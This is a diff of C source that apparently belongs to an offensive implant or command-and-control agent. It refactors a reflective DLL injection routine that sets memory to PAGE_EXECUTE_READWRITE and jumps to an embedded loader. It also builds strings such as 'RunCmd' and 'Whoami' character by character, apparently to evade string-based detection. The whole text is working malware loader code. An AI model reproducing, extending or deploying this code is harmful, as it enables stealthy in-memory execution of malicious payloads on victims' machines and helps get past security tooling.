@@ -20,24 +20,28 @@
 #define UUID_M '1','1','e','3','b','2','7','c','-','a','1','e','7','-','4','2','2','4','-','b','4','d','9','-','3','a','f','3','6','f','a','2','f','0','d','0',0
 #endif
 
-HANDLE loaderInjectRD(PAPI api, LPVOID lpDll, DWORD dwDllSize)
+//HANDLE loaderInjectRD(PAPI api, LPVOID lpDll, DWORD dwDllSize)
+HANDLE loaderInjectRD(PAPI api, PDLL pDll)
 {
     DWORD loaderOffset;
     REFLECTIVELOADER pReflectiveLoader;
     DLLMAIN pDllMain;
 
-    loaderOffset = GetRLOffset(api, lpDll);
+    //loaderOffset = GetRLOffset(api, lpDll);
+    loaderOffset = GetRLOffset(api, pDll->Buffer);
 
     #ifdef DEBUG
     WCHAR loader[] = { 'L', 'o', 'a', 'd', 'e', 'r', ':', ' ', '%', 'p', '\n', 0 };
-    ((WPRINTF)api->wprintf)(loader, (UINT_PTR)lpDll + loaderOffset);
+    //((WPRINTF)api->wprintf)(loader, (UINT_PTR)lpDll + loaderOffset);
+    ((WPRINTF)api->wprintf)(loader, (UINT_PTR)pDll->Buffer + loaderOffset);
     #endif
 
     //((WPRINTF)api->wprintf)(L"Origin DLL location: %p\n", lpDll);
-    pReflectiveLoader = (REFLECTIVELOADER)((UINT_PTR)lpDll + loaderOffset);
+    //pReflectiveLoader = (REFLECTIVELOADER)((UINT_PTR)lpDll + loaderOffset);
+    pReflectiveLoader = (REFLECTIVELOADER)((UINT_PTR)pDll->Buffer + loaderOffset);
 
     DWORD dwOldProtect;
-    ((VIRTUALPROTECT)api->VirtualProtect)(lpDll, dwDllSize, PAGE_EXECUTE_READWRITE, &dwOldProtect);
+    ((VIRTUALPROTECT)api->VirtualProtect)(pDll->Buffer, pDll->Size, PAGE_EXECUTE_READWRITE, &dwOldProtect);
 
     HANDLE hDllBase = NULL;
 
@@ -291,7 +295,8 @@ void myMain()
     ESG_STD_API EsgStdApi = { 0 };
     PESG_STD_API PEsgStdApi = &EsgStdApi;
 
-    pEsgStdDll->Buffer = loaderInjectRD(api, pEsgStdDll->Buffer, pEsgStdDll->Size);
+    //pEsgStdDll->Buffer = loaderInjectRD(api, pEsgStdDll->Buffer, pEsgStdDll->Size);
+    pEsgStdDll->Buffer = loaderInjectRD(api, pEsgStdDll);
 
     CHAR runCmd_c[] = { 'R', 'u', 'n', 'C', 'm', 'd', 0 };
     CHAR whoami_c[] = { 'W', 'h', 'o', 'a', 'm', 'i', 0 };
